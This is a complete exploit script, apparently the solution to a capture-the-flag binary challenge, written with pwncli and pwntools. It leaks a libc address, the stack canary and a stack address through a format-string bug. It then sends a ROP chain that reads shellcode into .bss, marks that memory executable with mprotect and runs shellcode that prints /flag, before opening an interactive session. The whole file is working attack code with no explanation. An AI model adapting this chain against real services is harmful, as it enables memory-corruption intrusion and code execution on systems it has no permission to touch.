#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

if gift['remote']:
    libc = ELF("./libc.so.6")

# offset 6
p.sendafter("Welcome! What is your name?\n", "%25$p,%27$p,%28$p")
m = p.recvline_startswith('0x')
log_ex(f"{m}")
leak_addr = int16(m[:14].decode()) - 324 - libc.sym['setvbuf']
log_libc_base_addr(leak_addr)
libc.address = leak_addr

canary = int16(m[15:33].decode())
log_address("canary", canary)

stack_addr = int16(m[34:48].decode())
log_address("stack", stack_addr)
start_addr = stack_addr - 0xc0

bss_addr = 0x601080
read_addr = 0x4005e0
puts_addr = 0x4005b0

libc_rdi_ret = leak_addr + 0x0000000000021112
libc_rdx_ret = leak_addr + 0x0000000000001b92
libc_rsi_ret = leak_addr + 0x00000000000202f8
libc_rax_ret = leak_addr + 0x000000000003a738
libc_syscall_ret = leak_addr + 0x00000000000bc3f5

payload = flat([
    0x68*"a",
    canary,
    0, 
    libc_rdi_ret, 0,
    libc_rsi_ret, bss_addr,
    libc_rdx_ret, 800,
    read_addr,
    libc_rdi_ret, bss_addr,
    puts_addr,
    libc_rdi_ret, bss_addr &~0xfff,
    libc_rsi_ret, 0x1000,
    libc_rdx_ret, 7,
    libc_rax_ret, SyscallNumber.amd64.MPROTECT,
    libc_syscall_ret,
    bss_addr
], filler="\x00", length=0x200)

p.sendafter("What can we help you?\n", payload)

p.send(asm(shellcraft.cat('/flag')))

flag_ = p.recvline_startswith("flag")

log_ex(f"Get flag: {flag_}")

p.interactive()

